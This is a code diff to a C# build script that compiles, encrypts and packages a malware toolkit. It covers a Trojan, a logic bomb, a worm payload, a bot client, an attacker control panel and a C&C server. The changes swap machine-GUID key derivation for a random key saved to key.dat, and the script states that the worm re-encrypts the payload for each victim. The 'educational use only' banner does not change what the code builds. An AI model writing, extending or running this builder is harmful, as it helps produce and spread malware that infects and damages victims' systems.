@@ -17,22 +17,25 @@ namespace Builder
         private static string ControlPanelDir;
         private static string WwwRootDir;
 
-        private static string MachineGuid;
+        // --- MODIFIED: Replaced MachineGuid with a randomly generated key ---
+        private static string initialEncryptionKey;
 
         static void Main(string[] args)
         {
             Console.WriteLine("===========================================");
             Console.WriteLine("   MALWARE BUILDER - EDUCATIONAL USE ONLY");
-            Console.WriteLine("   Polymorphic Encryption Edition");
+            Console.WriteLine("   Random Key Encryption Edition");
             Console.WriteLine("===========================================");
             Console.WriteLine();
 
             try
             {
                 InitializePaths();
-                GetMachineGuidAndDeriveKeys();
 
-                // Build original malware components
+                // --- MODIFIED: Generate a random key and save it to key.dat ---
+                GenerateAndStoreInitialKey();
+
+                // Build all projects
                 BuildProject("SharedCrypto");
                 BuildProject("Trojan");
                 BuildProject("LogicBomb");
@@ -44,10 +47,9 @@ namespace Builder
                 // Build attacker toolkit components
                 BuildProject("BotClient");
                 BuildProject("AttackerControlPanel");
-                // --- FIXED: Use the correct folder name with '&' ---
                 BuildProject("C&CServer");
 
-                // Package the worm and its payload
+                // Package the worm and its payload using the random key
                 EncryptTrojan();
                 CreateOutputStructure();
 
@@ -71,8 +73,10 @@ namespace Builder
                 LogInfo($"    - wwwroot/ (payload.zip)");
 
                 Console.WriteLine();
-                LogWarning("Note: bomb.encrypted is encrypted with THIS machine's GUID.");
-                LogWarning("Worm will re-encrypt for each victim with their specific GUID.");
+                // --- MODIFIED: Updated warning message ---
+                LogWarning("Note: bomb.encrypted is encrypted with a RANDOMLY GENERATED key.");
+                LogWarning("The key is stored in 'product/payload/key.dat'.");
+                LogWarning("The Worm will generate a new random key for each victim it infects.");
             }
             catch (Exception ex)
             {
@@ -119,14 +123,21 @@ namespace Builder
             Console.WriteLine();
         }
 
-        private static void GetMachineGuidAndDeriveKeys()
+        // --- NEW: Replaces the old GetMachineGuid method ---
+        private static void GenerateAndStoreInitialKey()
         {
-            LogInfo("Retrieving Machine GUID for polymorphic encryption...");
-            MachineGuid = CryptoUtils.GetMachineGuid();
-            LogSuccess($"Machine GUID: {MachineGuid}");
+            LogInfo("Generating initial random key for encryption...");
+            initialEncryptionKey = CryptoUtils.GenerateRandomKey();
+            LogSuccess($"Generated Key: {initialEncryptionKey}");
+
+            // Save the key to key.dat in the payload folder
+            string keyFilePath = Path.Combine(PayloadDir, "key.dat");
+            File.WriteAllText(keyFilePath, initialEncryptionKey);
+            LogSuccess($"Initial key saved to product/payload/key.dat");
             Console.WriteLine();
-            LogInfo("Deriving encryption keys from Machine GUID...");
-            CryptoUtils.LogDerivedKeys(MachineGuid);
+
+            LogInfo("Deriving encryption keys from random string...");
+            CryptoUtils.LogDerivedKeys(initialEncryptionKey);
             Console.WriteLine();
         }
 
@@ -134,7 +145,7 @@ namespace Builder
         {
             LogInfo($"Building {projectName} project...");
 
-            // --- FIXED: Handle cases where folder name (C&CServer) differs from project file name (CnCServer.csproj) ---
+            // --- BUG FIX: Correctly handle '&' in project name ---
             string csprojName = projectName.Replace("&", "n");
             string projectPath = Path.Combine(SolutionDir, projectName, $"{csprojName}.csproj");
 
@@ -172,11 +183,14 @@ namespace Builder
 
         private static void EncryptTrojan()
         {
-            LogInfo("Encrypting Trojan.exe with machine-specific key...");
+            LogInfo("Encrypting Trojan.exe with the generated random key...");
             string trojanExePath = FindExecutable("Trojan", "Trojan.exe");
             LogInfo($"Found Trojan.exe at: {trojanExePath}");
             string encryptedOutputPath = Path.Combine(PayloadDir, "bomb.encrypted");
-            CryptoUtils.EncryptFile(trojanExePath, encryptedOutputPath, MachineGuid);
+
+            // --- MODIFIED: Use the random key string for encryption ---
+            CryptoUtils.EncryptFile(trojanExePath, encryptedOutputPath, initialEncryptionKey);
+
             LogSuccess($"Trojan.exe encrypted successfully to 'bomb.encrypted'");
             Console.WriteLine();
         }
@@ -191,6 +205,8 @@ namespace Builder
             CopyFileToOutput("SharedCrypto", "SharedCrypto.dll", PayloadDir);
             CopyFileToOutput("SharedCrypto", "SharedCrypto.pdb", PayloadDir);
             LogSuccess("bomb.encrypted already in product/payload folder");
+            // --- NEW: Confirm key.dat is also present ---
+            LogSuccess("key.dat already created in product/payload folder");
             Console.WriteLine();
         }
 
@@ -236,7 +252,6 @@ namespace Builder
                 }
             }
 
-            // --- FIXED: Use the correct folder name with '&' ---
             string cncServerOutputDir = FindBuildOutputDirectory("C&CServer");
             CopyDirectoryContents(cncServerOutputDir, AttackerOutputDir);
             LogSuccess("Staged C&CServer into 'attack' folder");
